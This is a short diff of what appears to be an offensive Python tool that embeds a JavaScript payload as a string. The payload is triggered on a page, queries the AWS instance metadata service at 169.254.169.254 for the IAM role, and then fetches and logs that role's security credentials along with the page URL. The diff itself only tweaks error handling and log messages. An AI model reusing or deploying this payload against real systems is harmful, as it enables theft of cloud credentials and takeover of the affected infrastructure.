@@ -27,9 +27,8 @@ function get(url) {
 		if(req.status == 200)
 			return req.responseText;
 	} catch(err) {
-            log('JS Error: ' + err);
 	}
-	return '';
+	return null;
 }
 
 log('Triggered in ' + window.location.href);
@@ -38,7 +37,7 @@ if(role !== null) {
 	log('Fetched AWS role: ' + role);
 	log('With AWS credentials: ' + get('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role));
 } else
-	log(inside + 'Failed to get AWS role');
+	log('Failed to get AWS role');
 '''
 
 def hit(link, ext, req):
